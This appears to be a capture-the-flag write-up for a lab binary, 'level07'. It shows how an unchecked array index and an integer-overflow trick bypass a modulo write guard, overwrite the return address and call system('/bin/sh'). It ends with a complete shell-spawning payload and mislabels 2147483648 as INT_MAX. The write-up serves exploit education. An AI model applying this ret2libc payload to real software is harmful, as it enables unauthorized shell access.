# Level07 – Exploiting Out-of-Bounds Write


## What Does the Binary Do?
After reversing the binary, we observe:

It uses an array: data[100] to store and read values.

Certain indices are protected from writes if:

    (index % 3 == 0) || ((number >> 24) == 0xb7)
    (Likely to protect memory used by "wil", possibly the admin.)

#### There's no bounds check on the index, so we can access memory after the array!

## Understanding the Vulnerability
By starting at data[101], we test out-of-bounds memory access.

At data[114], we find:


    4158936339 → 0xf7e45513 (in hex)
Using GDB:

    x/i 0xf7e45513
Result:


    __libc_start_main+243
    This is the return address of main – i.e., what the program jumps to after it ends.

### Problem:
We can’t directly write to data[114], because:


    114 % 3 == 0 → write blocked
## Bypassing the Protection
We can bypass the modulo check by tricking the index:

    2147483648 (INT_MAX) + 114 = 2147483762
    2147483762 % 3 = 2 → ✅ not blocked
    So we can overwrite data[114] by writing to data[2147483762].

## The Exploit Strategy
Same idea as Level04:

Overwrite the return address with the address of system()

Place the address of "/bin/sh" nearby as an argument

When the program exits, it executes:

    system("/bin/sh")
## Finding the Required Addresses
1. Get system() address:
In GDB:

        p system

2. Get libc memory range:

        info proc map
3. Find "/bin/sh" string:

        find <libc_start>, <libc_end>, "/bin/sh"

## Final Payload Details
    system() = 0xf7e6aed0 = 4159090384

    "/bin/sh" = 0xf7f897ec = 4160264172

    We write:
    data[114] = system() (via index 2147483762)

    data[115] = padding (any value)

    data[116] = "/bin/sh"

## Final Exploit Payload

    (python -c 'print "store"';
    python -c 'print "4159090384"';        # system() address
    python -c 'print "2147483762"';        # bypassed index for data[114]
    python -c 'print "store"';
    python -c 'print "4160264172"';        # "/bin/sh" string address
    python -c 'print "116"';               # store at data[116]
    python -c 'print "quit"';
    cat) | ./level07